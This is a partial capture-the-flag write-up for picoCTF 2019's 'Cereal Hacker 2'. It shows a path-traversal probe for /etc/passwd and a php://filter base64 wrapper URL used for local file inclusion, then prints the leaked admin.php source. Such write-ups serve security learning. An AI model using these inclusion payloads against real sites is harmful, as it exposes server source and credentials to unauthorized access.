<h3>Challenge #18 Cereal Hacker 2</h3>
<blockquote>Get the admin's password. https://2019shell1.picoctf.com/problem/62195/ or http://2019shell1.picoctf.com:62195</blockquote>

Same login page as in Cereal Hacker 1.<br>I could have use some of the pentesting tools for scanning vulnerabilities , but I was doing this manually. I started for searching for LFI/RFI and to access for example <code>../../../../etc/passwd<code>. <br>The file wasn't found but i saw that it is appending .php extension at the end as a message. So that means we can actually get to the local files ,or the inclusion was done by using most likely require_once php method. One of the solutions to get to certain file was using <code>php://filter/convert.base64_encode/resource</code> . With this I am able to see any php file that is out there by outputing b64 , before it's being used by require_once method. <br> So first I tried with <blockquote>https://2019shell1.picoctf.com/problem/62195/index.php?file=php://filter/convert.base64-encode/resource=admin</blockquote>
<br>
And that gave me base64 output , after decoding b64 we've got code from admin.php which looked like this : 

```php

 <?php

require_once('cookie.php');

if(isset($perm) && $perm->is_admin()){
?>
	
	<body>
		<div class="container">
			<div class="row">
				<div class="col-sm-9 col-md-7 col-lg-5 mx-auto">
					<div class="card card-signin my-5">
						<div class="card-body">
							<h5 class="card-title text-center">Welcome to the admin page!</h5>
							<h5 style="color:blue" class="text-center">Flag: Find the admin's password!</h5>
						</div>
					</div>
				</div>
			</div>
		</div>

	</body>

<?php
}
else{
?>
	
	<body>
		<div class="container">
			<div class="row">
				<div class="col-sm-9 col-md-7 col-lg-5 mx-auto">
					<div class="card card-signin my-5">
						<div class="card-body">
							<h5 class="card-title text-center">You are not admin!</h5>
							<form action="index.php" method="get">
								<button class="btn btn-lg btn-primary btn-block text-uppercase" name="file" value="login" type="submit" onclick="document.cookie='user_info=; expires=Thu, 01 Jan 1970 00:00:18 GMT; domain=; path=/;'">Go back to login</button>
							</form>
						</div>
					</div>
				</div>
			</div>
		</div>

	</body>

<?php
}
?>

```
<br>
We can see that is using require_once for cookie.php so I just followed the same steps for all the things that I could get.